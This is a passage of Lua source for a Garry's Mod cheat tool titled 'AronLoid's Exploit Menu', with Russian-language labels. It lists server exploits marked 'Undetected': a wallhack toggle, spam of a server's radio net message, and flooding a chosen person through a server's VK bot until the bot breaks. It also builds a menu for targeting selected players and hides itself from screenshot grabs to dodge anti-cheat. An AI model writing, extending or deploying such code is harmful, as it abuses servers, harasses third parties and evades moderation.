		lply:SetNWBool('хищник_магнит', true)

	end, tn = 'hisnikmagnet', t = .1, rare = 1, status = 'Undetected' },

	

 	{ name = 'Включить глаза хищника', desc = 'Донатный ВХ', check = function()

 		return true

	end, func = function()

		lply:SetNWBool('хищник_глаза', true)

	end, tn = 'hisnikeyes', t = .1, rare = 1, status = 'Undetected' },

	

 	{ name = 'Спам звуком', desc = 'Раз в секунду активируется звук на большое растояние, не использовать долго (могут забанить)', check = function()

 		return netValid( 'wanted_radio' )

	end, func = function()

		net.Start( 'wanted_radio' )

		net.WriteEntity( lply )

		net.WriteInt( 1, 4 )

		net.SendToServer()

	end, tn = 'wantedradiospam', t = 1, rare = 2, status = 'Use at own risk' },

	

 	{ name = 'Флуд в ВК', desc = 'Определенному юзеру (нужно ввести ссылку ниже) будет флудить бот в ВК, после чего бот сломается на некоторое время', check = function()

 		return gavnoeofa

	end, func = function()

		net.Start( 'SendKodPlz' )

        net.WriteString( currenttext )

    	net.SendToServer()

	end, tn = 'vkfloodcode', t = .1, rare = 2, status = 'Undetected' },

}



table.sort( exploits, function( e1, e2 )

	return e1.rare > e2.rare

end )



exploitcount = #exploits



//Menu



local menu = vgui.Create( 'DFrame' )

menu:SetSize( scrw, scrh )

menu:Center()

menu:Hide()

menu:MakePopup()

menu:SetTitle( '' )

menu:ShowCloseButton()



function menu:Paint( w, h )

	if scrgrb() then

		return

	end

	

	if spotsdraw then

		surface.SetDrawColor( 45, 45, 45, 200 )

		surface.DrawRect( 0, 0, w, h )

		

		for a = 1, 25 do

			local spot = spotstable[ a ]

			surface.DrawCircle( spot.x, spot.y, 1, Color( 255, 255, 255 ) )

			

			for b = 1, 25 do

				local spot2 = spotstable[ b ]

				if a ~= b and math.abs( spot2.x - spot.x ) <= 100 and math.abs( spot2.y - spot.y ) <= 100 then

					surface.DrawLine( spot.x, spot.y, spot2.x, spot2.y )

				end

			end

		end

	else

		surface.SetDrawColor( bg.color )

		surface.DrawRect( 0, 0, w, h )

	end

	

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	local text = 'AronLoid\'s Exploit Menu | ' .. exploitavailable .. '/' .. exploitcount .. ' эксплоитов | ' .. version

	surface.SetTextColor( 255, 255, 255 )

	surface.SetFont( '_z_emm' )

	surface.SetTextPos( 5, 5 )

	surface.DrawText( text )

	if #antiexp > 0 then

		local col = math.cos( SysTime() * 10 ) * 127.5 + 127.5

		local text = 'Обнаружено: ' .. table.concat( antiexp, ', ' )

		surface.SetTextColor( col, 0, 255 - col )

		surface.SetTextPos( w - surface.GetTextSize( text ) - 40, 5 )

		surface.DrawText( text )

	end

end



menu.OldThink = menu.Think



function menu:Think()

	for a = 1, 25 do

		local spot = spotstable[ a ]

		if spot.x >= scrw or spot.x <= 0 then

			spot.x2 = -spot.x2

		end

			if spot.y >= scrh or spot.y <= 0 then

			spot.y2 = -spot.y2

		end

		spotstable[ a ].x = spot.x + spot.x2

		spotstable[ a ].y = spot.y + spot.y2

	end

	

	self:OldThink()

end



local bghtml = vgui.Create( 'DHTML', menu )

bghtml:SetPos( ( scrw - bg.w ) / 2 - 10, ( scrh - bg.h ) / 2 - 10 )

bghtml:SetHTML( '<img src=\"' .. bg.url .. '\">' )

bghtml:SetSize( bg.w + 100, bg.h + 100 )

bghtml:SetVisible( !spotsdraw )



local col = spotsdraw and 45 or 175

local bgtoggle = vgui.Create( 'DButton', menu )

bgtoggle:SetSize( 40, 20 )

bgtoggle:SetPos( 5, scrh - 20 )

bgtoggle:SetText( '' )



function bgtoggle:Paint( w, h )

	if scrgrb() then

		return

	end

	

	if col < 175 and !spotsdraw then

		col = Lerp( FrameTime() * 10, col, 175 )

	elseif col > 45 and spotsdraw then

		col = Lerp( FrameTime() * 10, col, 45 )

	end

	

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	surface.SetDrawColor( col, 220 - col, 45, 175 )

	surface.DrawRect( 1, 1, w - 2, h - 2 )

	

	surface.SetFont( '_z_em' )

	surface.SetTextColor( 255, 255, 255 )

	surface.SetTextPos( 5, 0 )

	surface.DrawText( 'Фон' )

end



function bgtoggle:OnCursorEntered()

	playsound( sounds[ 1 ] )

end



function bgtoggle:DoClick()

	spotsdraw = !spotsdraw

	bghtml:SetVisible( !spotsdraw )

	

	if spotsdraw then

		cookie.Delete( '_z_wallpaper' )

	else

		cookie.Set( '_z_wallpaper', '' )

	end

end



local dtext = vgui.Create( 'DTextEntry', menu )

dtext:SetSize( scrw - 55, 20 )

dtext:SetPos( 50, scrh - 20 )

dtext:SetText( '' )

function dtext:OnTextChanged( text )

	currenttext = self:GetText()

end

dtext.paint = dtext.Paint

function dtext:Paint( w, h )

	if !scrgrb() then

		self:paint( w, h )

	end

end



local close = vgui.Create( 'DButton', menu )

close:SetSize( 30, 15 )

close:SetPos( scrw - 35, 0 )

close:SetText( '' )

function close:Paint( w, h )

	if scrgrb() then

		return

	end

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	surface.SetDrawColor( 175, 45, 45, 175 )

	surface.DrawRect( 1, 1, w - 2, h - 2 )

	surface.SetFont( '_z_em' )

	surface.SetTextColor( 255, 255, 255 )

	surface.SetTextPos( 11, -4 )

	surface.DrawText( 'x' )

end



function close:OnCursorEntered()

	playsound( sounds[ 1 ] )

end



function close:DoClick()

	menu:Hide()	

end



local binds = {}

local dexp = vgui.Create( 'DPanelList', menu )

dexp:SetSize( scrw, scrh - 45 )

dexp:SetPos( 0, 20 )

dexp:SetPadding( 15 )

dexp:SetSpacing( 1 )

dexp:EnableVerticalScrollbar()



for _, exploit in pairs( exploits ) do

	if exploit.check() then

		if exploit.tn and timer.Exists( '_z_em_' .. exploit.tn ) then

			timer.Remove( '_z_em_' .. exploit.tn )

			if exploit.deact then

				exploit.deact()

			end

		end

		exploitavailable = exploitavailable + 1

		

		local col = 45

		local but = vgui.Create( 'DButton', dply )

		but:SetSize( 0, 40 )

		but:SetText( '' )

		function but:Paint( w, h )

			if scrgrb() then

				return

			end

			

			if exploit.active then

				if col < 175 then

					col = Lerp( FrameTime() * 10, col, 175 )

				end

			elseif col > 0 then

				col = Lerp( FrameTime() * 10, col, 0 )

			end

			

			surface.SetDrawColor( 255, 255, 255, 128 )

			surface.DrawOutlinedRect( 0, 0, w, h, 1 )

			

			surface.SetDrawColor( 0, col, 0, 175 )

			surface.DrawRect( 1, 1, w - 2, h - 2 )

			

			local status = exploit.status

			surface.SetFont( '_z_em' )

			surface.SetTextColor( 100, 100, 100 )

			

			surface.SetTextPos( w - surface.GetTextSize( status ) - 2, 2.5 )

			surface.DrawText( status )

			

			surface.SetTextColor( 255, 255, 255 )

			local name = exploit.name

			surface.SetTextPos( ( w - surface.GetTextSize( name ) ) / 2, 2.5 )

			surface.DrawText( name )

			

			local desc = exploit.desc

			surface.SetFont( '_z_emm' )

			surface.SetTextPos( w / 2 - surface.GetTextSize( desc ) / 2, 20 )

			surface.DrawText( desc )

		end

		

		function but:OnCursorEntered()

			playsound( sounds[ 1 ] )

		end

		

		function but:DoClick()

			local active = exploit.active

			if !active then

				playsound( sounds[ 2 ] )

			end

		

			local t = exploit.t

			local act = exploit.act

			local deact = exploit.deact

			local func = exploit.func

			

			if isnumber( t ) then

				if active then

					if func then

						timer.Remove( '_z_em_' .. exploit.tn )

					end

					exploit.active = false

					playsound( sounds[ 3 ] )

					if deact then

						deact()

					end

					

					local tags = exploit.tags

					if tags then

						for name in pairs( tags ) do

							exploitinfo[ name ] = nil

						end

					end

				else

					local tags = exploit.tags

					if tags then

						for name, value in pairs( tags ) do

							exploitinfo[ name ] = value

						end

					end

					

					if act then

						act()

					end

					

					if func then

						timer.Create( '_z_em_' .. exploit.tn, math.max( t, .01 ), 0, exploit.func )

					end

					exploit.active = true

				end

			else

				if func then

					exploit.func()

				end

				

				exploit.active = true

				

				timer.Simple( .1, function()

					exploit.active = false

				end )

			end

		end

		binds[ exploit.name ] = function()

			but:DoClick()

		end

		dexp:AddItem( but )

	end

end



local dplypan = vgui.Create( 'DPanel', menu )

dplypan:SetPos( scrw - 15, 20 )

dplypan.Opened = false

dplypan.w = 0

dplypan:SetSize( 315, scrh - 45 )



function dplypan:Think()

	if self.Opened and self.w < 315 then

		self.w = Lerp( FrameTime() * 10, self.w, 315 )

		dplypan:SetPos( scrw - self.w, 25 )

	elseif !self.Opened and self.w > 15 then

		self.w = Lerp( FrameTime() * 10, self.w, 15 )

		dplypan:SetPos( scrw - self.w, 25 )

	end

end



function dplypan:Paint( w, h )

	if scrgrb() then

		return

	end

	

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	surface.SetDrawColor( 50, 50, 50, 175 )

	surface.DrawRect( 1, 1, w - 2, h - 2 )

	

	surface.SetDrawColor( 25, 25, 25, 175 )

	surface.DrawRect( 15, 1, w - 17, h - 2 )

end



local dply = vgui.Create( 'DPanelList', dplypan )

dply:SetSize( 300, scrh - 85 )

dply:SetPos( 15, 20 )

dply:SetPadding( 5 )

dply:SetSpacing( 1 )

dply:EnableVerticalScrollbar()



local selectall = vgui.Create( 'DButton', dplypan )

selectall:SetSize( 300, 20 )

selectall:SetPos( 15, scrh - 65 )

selectall:SetText( '' )



function selectall:Paint( w, h )

	if scrgrb() then

		return

	end

	

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	surface.SetDrawColor( 75, 75, 75, 175 )

	surface.DrawRect( 1, 1, w - 2, h - 2 )

	

	surface.SetTextColor( 255, 255, 255 )

	surface.SetFont( '_z_em' )

	local tw = surface.GetTextSize( 'Выбрать всех' )

	surface.SetTextPos( ( w - tw ) / 2, 0 )

	surface.DrawText( 'Выбрать всех' )

end



function selectall:OnCursorEntered()

	playsound( sounds[ 1 ] )

end



function selectall:DoClick()

	playsound( sounds[ 2 ] )

	

	local plys = player.GetHumans()

	

	for i = 1, #plys do

		local ply = plys[ i ]

		

		if selectedall then

			selectedplys[ ply ] = nil

		else

			if !whitelist[ ply ] and ply ~= lply then

				selectedplys[ ply ] = true

			end

		end

	end

	

	selectedall = !selectedall

end



local dplyopen = vgui.Create( 'DButton', dplypan )

dplyopen:SetSize( 15, scrh - 45 )

dplyopen:SetText( '' )



function dplyopen:Paint( w, h )

	if scrgrb() then

		return

	end

	

	surface.SetDrawColor( 255, 255, 255, 128 )

	surface.DrawOutlinedRect( 0, 0, w, h, 1 )

	

	surface.SetDrawColor( 75, 75, 75, 175 )

	surface.DrawRect( 1, 1, w - 2, h - 2 )

	

	surface.SetTextColor( 255, 255, 255 )

	surface.SetFont( '_z_em' )

	local _, th = surface.GetTextSize( '>' )

	surface.SetTextPos( 3, ( h - th ) / 2 )

	surface.DrawText( dplypan.Opened and '>' or '<' )

end



function dplyopen:OnCursorEntered()

	playsound( sounds[ 1 ] )

end



function dplyopen:DoClick()

	dplypan.Opened = !dplypan.Opened

end



if dply.DVScrollbar then

	function dply.DVScrollbar:Paint()

	end

end



concommand.Remove( '_z_open' )

concommand.Add( '_z_open', function()

	if antiexpdetect then

		antiexpdetect = false

		playsound( sounds[ 4 ] )

	end

	

	menu:Show()

	menu:Center()

	

	local items = dply:GetItems()

	for i = 1, #items do

		local item = items[ i ]

		

		if item then

			local ply = item.ply

			

			if !ply:IsValid() and selectedplys[ ply ] then

				selectedplys[ ply ] = nil

			end

			

			item:Remove()

		end

	end

	

	local plys = player.GetAll()

	table.sort( plys, function( a, b )

		return a:Team() > b:Team()

	end )

	

	for i = 1, #plys do

		local ply = plys[ i ]

		if ply ~= lply or whitelist[ ply:SteamID() ] then

			local col = selectedplys[ ply ] and 200 or 0

			local but = vgui.Create( 'DButton', dply )

			but:SetSize( 0, 35 )

			but:SetText( '' )

			

			function but:Paint( w, h )

				if scrgrb() then

					return

				end

				

				if !ply:IsValid() then

					selectedplys[ ply ] = nil

					self:Remove()

					return

				end

				

				if col < 200 and selectedplys[ ply ] then

					col = Lerp( FrameTime() * 10, col, 200 )

				elseif col > 0 and !selectedplys[ ply ] then

					col = Lerp( FrameTime() * 10, col, 0 )

				end

				surface.SetDrawColor( 255, 255, 255, 128 )

				surface.DrawOutlinedRect( 0, 0, w, h, 1 )

				

				surface.SetDrawColor( 0, col, 0, 175 )

				surface.DrawRect( 1, 1, w - 2, h - 2 )

				

				surface.SetFont( '_z_em' )

				surface.SetTextColor( 255, 255, whitelist[ ply:SteamID() ] and 0 or 255 )

				local name = ply:Name()

				surface.SetTextPos( w / 2 - surface.GetTextSize( name ) / 2, 2.5 )

				surface.DrawText( name )

				

				surface.SetFont( '_z_emm' )

				surface.SetTextPos( 5, h - 15 )

				surface.DrawText( ply:GetUserGroup() )

				

				local text = team.GetName( ply:Team() )

				surface.SetTextPos( w - surface.GetTextSize( text ) - 5, h - 15 )

				surface.DrawText( text )

			end

			

			function but:OnCursorEntered()

				playsound( sounds[ 1 ] )

			end

			

			function but:DoClick()

				if selectedplys[ ply ] then

					selectedplys[ ply ] = nil

				else

					selectedplys[ ply ] = true

				end

			end

			

			but.ply = ply

			dply:AddItem( but )

		end

	end

end )



concommand.Remove( '_z_exp' )

concommand.Add( '_z_exp', function( _, _, _, text )

	local bind = binds[ text ]

	if bind then

		bind()

	else

		print( 'not found' )

	end

end )
